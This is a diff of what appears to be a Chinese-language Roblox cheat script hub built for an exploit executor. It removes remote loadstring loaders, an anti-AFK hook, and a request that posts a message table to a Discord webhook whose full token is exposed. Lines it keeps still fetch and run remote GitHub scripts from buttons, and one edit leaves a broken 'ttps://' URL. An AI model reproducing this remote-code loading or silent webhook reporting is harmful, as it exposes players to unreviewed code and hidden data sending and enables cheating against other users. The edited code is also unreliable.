@@ -570,23 +570,6 @@ Notification:Notify(
     {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(150, 150, 150)}
 )
 
-local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaodi7598/-1.0/refs/heads/main/%E9%80%9A%E7%9F%A51.lua"))()
-local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaodi7598/-1.0/refs/heads/main/%E9%80%9A%E7%9F%A52.lua"))()
-
-Notification:Notify(
-    {Title = "已开启反挂机", Description = "作者帮助你开启反挂机了"},
-    {OutlineColor = Color3.fromRGB(255, 255, 255), Time = 9, Type = "image"},
-    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(150, 150, 150)}
-)
-
--- 反挂机脚本保持不变
-local vu = game:GetService("VirtualUser")
-game:GetService("Players").LocalPlayer.Idled:connect(function()
-    vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-    wait(1)
-    vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-end)
-
 local Window = WindUI:CreateWindow({
     Title = '<font color="#FF3333">妥</font><font color="#FF9933">协</font><font color="#FFFF33">脚</font><font color="#33FF33">本</font>',
     Icon = "badge-check",
@@ -1383,10 +1366,19 @@ if not getgenv().LanguageService then
     getgenv().LanguageService = LanguageService
 end
 
--- 初始化语言服务
-LanguageService:Initialize()
+function getIcon(title)
+    return 0
+end
 
-print("🌐 语言设置模块加载完成 - 支持中文/英文/日语")
+function Tab(title)
+    return Window:Tab({ Title = title, Icon = getIcon(title) })
+end
+
+-- 初始化语言服务（增加容错，报错不阻断标签创建）
+pcall(function()
+    LanguageService:Initialize()
+    print("🌐 语言设置模块加载完成 - 支持中文/英文/日语")
+end)
 
 local Tab0 = Tab("简介")
 -- 自动打开简介标签（核心新增代码）
@@ -5046,7 +5038,7 @@ end)
 
 Button(Tab6, "迪脚本", function()
     pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ddjlb7598/sy/refs/heads/main/%E8%BF%AA%E8%BF%AA%E4%BF%B1%E4%B9%90%E9%83%A8"))()
+        loadstring(game:HttpGet("ttps://raw.githubusercontent.com/ddjlb7598/sy/refs/heads/main/%E8%BF%AA%E8%BF%AA%E4%BF%B1%E4%B9%90%E9%83%A8"))()
     end)
 end)
 
@@ -8279,11 +8271,3 @@ local msg = {
     }
   }
 }
-
-local request = http_request or request or HttpPost or syn.request
-request({
-  Url = "https://discord.com/api/webhooks/1451570468845781087/KJeSsLAAw6sH2HcSriylltoRFc9Pb1Q2tSo-Xaya_5-dQ8S4kR98zeL7aBUNlNycsUjv",
-  Method = "POST",
-  Headers = {["Content-Type"] = "application/json"},
-  Body = game.HttpService:JSONEncode(msg)
-})
